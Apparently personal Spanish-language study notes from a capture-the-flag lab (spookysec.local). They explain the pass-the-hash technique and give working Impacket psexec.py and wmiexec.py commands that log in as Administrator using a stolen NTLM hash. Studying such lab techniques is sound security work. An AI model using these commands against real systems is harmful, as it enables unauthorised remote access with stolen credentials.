# **Pass the hash con psexec**
Se trata de robar una credencial de usuario en forma de hash; y luego sin descifrar, la reutiliza para engañar a un sistema de autenticación para que cree una nueva sesión autenticada en la misma red. Es decir, se trata de una técnica que nos permite loguearnos con un usuario simplemente proporcionando su hash; y para ello podemos usar psexec.
```
psexec.py Administrator@spookysec.local -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```
![[Pasted image 20240717113510.png]]
[[MAQUINA ATTACKTIVE DIRECTORY(enum4linux, kerbrute enumerar usuarios, ASREPRoasting obtener TGT, john the ripper, smbclient para listar recursos compartidos, secredump dumpear hashes y pass the hash)]]

-----------------------------
# **impacket wmiexec**

También podemos hacer esto mismo con wmiexec de impacket de la siguiente forma, donde hacemos un pass the hash y nos autenticamos:
```
wmiexec.py spookysec.local/Administrator@10.10.143.170 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```
![[Pasted image 20240717122508.png]]

